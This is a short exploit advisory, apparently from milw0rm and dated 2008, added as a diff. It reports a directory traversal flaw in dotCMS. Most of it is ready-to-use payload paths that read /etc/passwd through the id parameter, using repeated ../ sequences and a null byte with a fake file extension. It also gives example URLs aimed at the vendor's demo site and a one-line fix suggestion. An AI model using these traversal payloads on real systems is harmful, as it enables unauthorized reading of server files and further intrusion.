@@ -1,0 +1,21 @@
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
++ script:dotCMS
++ home: http://www.dotcms.org
++ demo: http://www.dotcms.org/the_dotcms/demos/demo.dot
++ founder: Don of h4cky0u.org
++ Vulnerability: Directory traversal
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+exploit:
+/index.dot?id=../../../../../../../../etc/passwd%00.jpg
+/macros/macros_detail.dot?id=../../../../../../../../etc/passwd%00.html
+
+example:
+http://demo.dotcms.org/news/index.dot?id=../../../../../../../../etc/passwd%00.jpg
+http://demo.dotcms.org/getting_started/macros/macros_detail.dot?id=../../../../../../../../etc/passwd%00.html
+
+solution:
+Script should filter meta characters from user input.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+# milw0rm.com [2008-08-15]
